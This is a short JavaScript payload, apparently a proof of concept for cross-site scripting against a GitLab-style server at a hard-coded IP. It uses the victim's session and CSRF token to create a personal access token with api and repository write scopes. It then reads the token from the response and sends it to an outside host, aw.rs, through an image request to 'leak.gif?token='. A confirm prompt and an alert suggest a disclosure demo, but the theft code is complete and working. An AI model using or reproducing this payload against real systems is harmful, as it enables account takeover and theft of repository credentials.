async function getToken() {

  const formData = new FormData();
  
  formData.append(
    document.querySelector('meta[name="csrf-param"]').content,
    document.querySelector('meta[name="csrf-token"]').content
  );

  formData.append("personal_access_token[name]", "test");
  formData.append("personal_access_token[scopes][]", "api");
  formData.append("personal_access_token[scopes][]", "read_repository");
  formData.append("personal_access_token[scopes][]", "write_repository");
  formData.append("personal_access_token[scopes][]", "write_registry");

  const response = await fetch(
    "https://65.52.77.188/-/profile/personal_access_tokens",
    {
      credentials: "include",
      body: formData,
      headers: {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "en-US,en;q=0.9,sv-SE;q=0.8,sv;q=0.7",
            "sec-ch-ua": "\" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"",
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
        "content-type": "application/x-www-form-urlencoded"
        
      },
        referrer: "https://65.52.77.188/-/profile/personal_access_tokens",
  referrerPolicy: "strict-origin-when-cross-origin",
      method: "POST",
      mode: "cors"
    }
  )

  const parser = new DOMParser();
  const doc = parser.parseFromString(await response.text(), "text/html");

  return doc.querySelector("#created-personal-access-token").value;
}

if(!donescript) {
  var donescript=true;
if (confirm("Create an access token?")) {
  getToken().then(token => {
    alert("Created token is: " + token);
    const image = new Image();
    image.src = `//aw.rs/g/leak.gif?token=${token}`;
  });
}}
